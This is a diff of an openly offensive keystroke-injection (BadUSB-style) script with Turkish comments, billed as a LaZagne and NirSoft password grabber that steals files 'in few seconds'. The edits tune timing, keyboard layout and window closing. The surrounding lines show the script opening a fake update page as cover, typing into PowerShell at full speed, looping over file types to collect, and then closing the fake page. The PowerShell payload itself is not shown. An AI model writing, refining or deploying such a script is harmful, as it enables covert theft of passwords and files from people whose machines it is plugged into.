@@ -1,11 +1,14 @@
-// LaZagne-PasswordGrabber, NirSoft_Passwd, StealFiles in Few Seconds
-// @KekikAkademi Edit ~
-delay(500);
+// 3in1-TriggerAct
+
+delay(5000); // USB Bağlanmasını Bekliyor
+layout("US"); // US Klavye Düzeni Seçiyor
+delay(3000); // USB Adaptasyonu Bekleniyor
 press("ALT SHIFT"); // Yerel Klavye Düzeni Değiştiriliyor
 delay(500);
-// @KekikAkademi Edit #
+press("ALT F4"); // Açılan USB Sayfası Kapatılıyor
+delay(500);
 
-layout("US"); // US Klavye Düzeni Seçiyor
+// LaZagne-PasswordGrabber, NirSoft_Passwd, StealFiles in Few Seconds
 typingSpeed(0,0);	// Hızlı Yazması İçin
 
 // Fake Update Sayfası Açılıyor
@@ -64,9 +67,7 @@ for (var i = 0; i < filetypes.length; i++) {
 type("exit\n");  // PowerShell Kapatılıyor
 
 // Fake Update Sayfası Kapatılıyor
-delay(750);
-press("ALT TAB");
-delay(500);
+delay(5000);
 press("ALT F4");
 
 // @KekikAkademi Edit ~
